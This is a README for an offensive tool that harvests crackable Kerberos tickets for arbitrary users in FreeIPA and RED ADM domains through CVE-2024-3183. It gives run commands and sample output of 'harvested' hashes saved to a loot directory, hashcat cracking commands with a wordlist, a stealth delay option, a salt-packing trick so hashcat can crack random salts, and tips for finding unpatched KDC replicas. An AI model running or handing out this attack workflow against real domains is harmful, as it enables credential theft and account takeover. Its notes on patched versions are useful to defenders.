# iparoasting — Automated Kerberoasting for FreeIPA / RED OS

The tool implements a Kerberoasting attack in **FreeIPA** and **RED ADM** domains based on  [**CVE-2024-3183**](https://github.com/Im10n/CVE-2024-3183-POC/tree/main). 
The main goal: an authenticated user with any privileges can obtain a TGS-ticket for an arbitrary domain account. The ticket is encrypted with the key of the *target* user, which can be recovered offline using a dictionary.

## How it works
1. **Salt and etype** — for each target, an `AS-REQ` is sent without preauth; the KDC replies with a `KRB-ERROR` (error-code 25, `KDC_ERR_PREAUTH_REQUIRED`); its field `e-data` contains `PA-ETYPE-INFO2`, from which the target user's salt, etype, and string-to-key parameters are taken.
2. **Ticket collection** — with two methods:
   - **primary**: an `AS-REQ` by the authenticated user (preauth is sent as part of the request, so no separate authentication step is needed) with `sname = <target>`. The KDC returns a ticket encrypted with the target account's key;
   - **secondary**: the classic TGS-REQ via getKerberosTGT and getKerberosTGS. May fail with the `KRB_AP_ERR_INAPP_CKSUM` error.
3. **Export hashes** — `$krb5tgs$` lines are written to a common file, plus separate per-mode files (`*_19700.txt`, `*_19600.txt`, `*_13100.txt`). 

## Requirements

```bash
pip3 install -r requirements.txt
```

## Usage

```bash
chmod +x iparoasting.py

#    The password will be requested interactively if -p is omitted.:
./iparoasting.py -d test.local.corp -u i_petrov -p 'Passw0rd' --kdc-ip 10.0.0.1 \
                 -U users.txt -o hashes.txt --save-dir loot --sleep 2

# 2. Bruteforcing using GPU:
hashcat -m 19700 hashes_19700.txt rockyou.txt        # etype 18 (AES256)
hashcat -m 19600 hashes_19600.txt rockyou.txt        # etype 17 (AES128)
hashcat -m 13100 hashes_13100.txt rockyou.txt        # etype 23 (RC4)

```

### Example

```
$ ./iparoasting.py -d test.local.corp -u i_petrov --kdc-ip 10.0.0.1 -U users.txt -o hashes.txt --save-dir loot
[*] Authentication: i_petrov@TEST.LOCAL.CORP (KDC: 10.0.0.1)
[*] Targets: 2 | output: hashes.txt

[1/2] a_test@TEST.LOCAL.CORP
      [+] Ticket (AS-REQ (sname=a_test)): etype=18 kvno=5 cipher=1256 bytes | salt=b'TEST.LOCAL.CORPA_Test'
      [+] Hashes: hashes.txt (supported mode 19700)
      [+] Artifact: loot/a_test.json
[2/2] b_gone@TEST.LOCAL.CORP
      [-] Skipped: user not found (KDC_ERR_C_PRINCIPAL_UNKNOWN)

================================================================
USER                      STATUS
----------------------------------------------------------------
a_test                    harvested (etype 18)
b_gone                    user not found (KDC_ERR_C_PRINCIPAL_UNKNOWN)
================================================================
[*] Next step:
    hashcat -m 19700 hashes.txt <wordlist>
```

| Argument | Description |
| --- | --- |
| -d, --domain | domain realm, e.g. test.local.corp |
| --kdc-ip | IP/FQDN of the KDC; if omitted, resolved via the domain's DNS |
| -u, --username | login of a valid account used for authentication |
| -p, --password | user password; asked interactively if omitted |
| --sleep SEC | pause between targets in seconds (stealth; default 0) |
| USER ... | target logins (or SPNs) as positional arguments |
| -U, --users-file | file with logins, one per line (user@REALM and # comments allowed) |
| --salt-format FMT | format of salt if the KDC gave none; (default {realm}{user} — the MIT/FreeIPA standard) |
| -o, --out FILE | hashcat hash file (default hashes.txt); with mixed etypes, per-mode files <base>_<mode>.txt are also written |
| --save-dir DIR | optional directory for JSON artifacts: salt, etype, kvno, cipher-hex and the ready hashcat line per target |
| --debug | impacket debug output (full Kerberos exchange trace) |

## Hash and salt format

The string format that was tested byte-by-byte using hashcat self-tests, modes 19600/19700:

```
$krb5tgs$18$<user>$<REALM>$<mac12hex>$<edata_hex>
```

where `mac` is the 12-byte HMAC-SHA1 checksum from the *end* of the ciphertext and edata is the remainder (hashcat's line format puts the mac *before* the edata, while in the wire blob it sits at the *end*).

**Salt.** Modes 19600/19700 have no salt field: hashcat derives the salt from the line fields as REALM+user. The tool accounts for this automatically:

- **standard salt** REALM+user (typical of FreeIPA/MIT) is split across the corresponding fields and goes into the line as is;
- **arbitrary/random salt** packed with a trick: the salt is cut at the first lowercase letter; the uppercase part goes to REALM and the remainder to user. Then `UPPER(realm)+user == salt`, and hashcat cracks the hash correctly (verified against a blob from the original PoC with a random salt). In this case the user/realm fields merely carry the salt — the real login is not present in the line;
- only two salt kinds cannot be packed: those containing `$` (hashcat's field separator) and those starting with a lowercase letter (hashcat rejects an empty realm field); such targets get a warning and the hash is not written;
- the "hashcat mode 19800 with specific salt" advice from the [PoC](https://github.com/Im10n/CVE-2024-3183-POC) does not work: modes 19800/19900 are actually `$krb5pa$` (Pre-Auth, key usage 1) — a different format with different semantics.

For RC4 (etype 23) no salt is needed `$krb5tgs$23$*user$realm$*$chk$edata` (the 16-byte MD5 MAC at the start of the blob).

## Limitations

- etype 19/20 (AES-SHA2) are not supported by impacket (standard FreeIPA issues 17/18).
- OTP/SPAKE/FAST preauth on the domain → authentication via impacket will fail (a KDC error is printed).
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` means the target has no Kerberos keys or **the domain is patched against CVE-2024-3183** (see the section below).
- Direct communication with the KDC over TCP/88; no proxying is supported.

### Patched domain (fix CVE-2024-3183)

In FreeIPA ≥ 4.11.2 / 4.12.1 (and backports: RHEL errata [RHBA-2024:3933](https://access.redhat.com/errata/RHBA-2024:3933), June 2024; RED OS/RED ADM) the vector is closed: the `ipa-kdb` driver no longer issues tickets for user principals without an SPN. Both AS-REQs with `sname=<user>` and TGS-REQs are rejected with `KDC_ERR_S_PRINCIPAL_UNKNOWN` (*Server not found in Kerberos database*).

How to distinguish a patched domain from a non-existent account:

```bash
# Does the account exist? (PREAUTH_REQUIRED + salt = exists; Client not found = no)
printf "%b" "0\n" | KRB5_TRACE=/dev/stdout kinit Administrator@TEST.LOCAL.CORP

# is TGS still working (an existing SPN): works -> users are blocked => it's the patch
kvno ldap/ipa-01.test.local.corp@TEST.LOCAL.CORP
```

Tip: a domain may have several KDC replicas and not all of them may be patched — try another replica.
